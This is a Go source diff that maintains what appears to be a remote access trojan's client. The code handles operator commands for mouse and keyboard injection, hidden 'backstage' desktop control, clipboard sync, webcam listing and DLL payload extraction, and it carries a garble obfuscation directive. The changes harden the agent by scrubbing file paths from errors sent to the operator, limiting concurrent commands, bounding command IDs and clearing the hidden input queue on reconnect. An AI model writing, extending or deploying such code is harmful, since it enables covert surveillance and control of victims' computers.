@@ -32,6 +32,19 @@ import (
 
 var ErrReconnect = errors.New("reconnect requested")
 
+// sanitizePathErr strips filesystem paths from error strings before they are
+// sent to the operator, leaving only the OS-level error message.
+func sanitizePathErr(err error) string {
+	if err == nil {
+		return ""
+	}
+	var pathErr *os.PathError
+	if errors.As(err, &pathErr) {
+		return pathErr.Op + " " + filepath.Base(pathErr.Path) + ": " + pathErr.Err.Error()
+	}
+	return err.Error()
+}
+
 var (
 	activeCommands        = make(map[string]context.CancelFunc)
 	activeCommandsMu      sync.Mutex
@@ -43,6 +56,7 @@ var (
 	backstageInputQueue   chan backstageInputEvent
 	backstageInputDropped atomic.Uint64
 	fileHashSlots         = make(chan struct{}, 2)
+	commandSem            = make(chan struct{}, 32)
 )
 
 const cloneProgressMinInterval = 100 * time.Millisecond
@@ -134,6 +148,7 @@ func resetForReconnect(env *runtime.Env) {
 	env.BackstageKeyboardControl = false
 	env.BackstageCursorCapture = false
 	env.BackstageSelectedDisplay = 0
+	clearbackstageInputQueue()
 	env.BackstageMu.Unlock()
 
 	env.WebcamMu.Lock()
@@ -394,10 +409,13 @@ func sendCommandResultSafe(env *runtime.Env, cmdID string, ok bool, message stri
 	}
 }
 
-func sendCommandResultAsync(env *runtime.Env, cmdID string) {
+func sendCommandResultAsync(ctx context.Context, env *runtime.Env, cmdID string) {
 	go func() {
 		defer recoverAndLog("sendCommandResultAsync", nil)
-		sendCommandResultSafe(env, cmdID, true, "")
+		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
+		if err := wire.WriteMsg(ctx, env.Conn, res); err != nil {
+			log.Printf("command_result send failed: %v", err)
+		}
 	}()
 }
 
@@ -573,6 +591,9 @@ func extractDLLBytes(payload map[string]interface{}) []byte {
 func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	cmdID, _ := envelope["id"].(string)
+	if len(cmdID) > 128 {
+		return nil
+	}
 	actionValue, _ := envelope["commandType"].(string)
 	action := wire.CommandType(actionValue)
 
@@ -997,7 +1018,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		if err := ClipboardSyncGet(ctx, env, source); err != nil {
 			log.Printf("clipboard_sync: get failed: %v", err)
-			sendCommandResultSafe(env, cmdID, false, err.Error())
+			sendCommandResultSafe(env, cmdID, false, sanitizePathErr(err))
 			return nil
 		}
 		sendCommandResultSafe(env, cmdID, true, "")
@@ -1017,7 +1038,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "desktop_mouse_move":
 		if !env.MouseControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -1025,11 +1046,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		y, _ := payloadInt32(payload, "y")
 		absX, absY := resolveDesktopPoint(env.SelectedDisplay, x, y)
 		setCursorPos(absX, absY)
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 	case "desktop_mouse_down":
 		if !env.MouseControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -1041,11 +1062,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseDown(btn)
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 	case "desktop_mouse_up":
 		if !env.MouseControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -1057,11 +1078,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseUp(btn)
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 	case "desktop_mouse_wheel":
 		if !env.MouseControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -1073,11 +1094,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseWheel(delta)
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 	case "desktop_key_down":
 		if !env.KeyboardControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -1090,11 +1111,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		if vk := keyCodeToVK(code); vk != 0 {
 			sendKeyDown(vk)
 		}
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 	case "desktop_key_up":
 		if !env.KeyboardControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -1107,11 +1128,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		if vk := keyCodeToVK(code); vk != 0 {
 			sendKeyUp(vk)
 		}
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 	case "desktop_text":
 		if !env.KeyboardControl {
-			sendCommandResultAsync(env, cmdID)
+			sendCommandResultAsync(ctx, env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -1124,7 +1145,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		if text != "" {
 			sendTextInput(text)
 		}
-		sendCommandResultAsync(env, cmdID)
+		sendCommandResultAsync(ctx, env, cmdID)
 		return nil
 
 	// ==================== backstage COMMANDS ====================
@@ -2469,7 +2490,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "webcam_list":
 		devices, err := capture.ListWebcams()
 		if err != nil {
-			sendCommandResultSafe(env, cmdID, false, err.Error())
+			sendCommandResultSafe(env, cmdID, false, sanitizePathErr(err))
 			return nil
 		}
 		out := make([]wire.WebcamDevice, 0, len(devices))
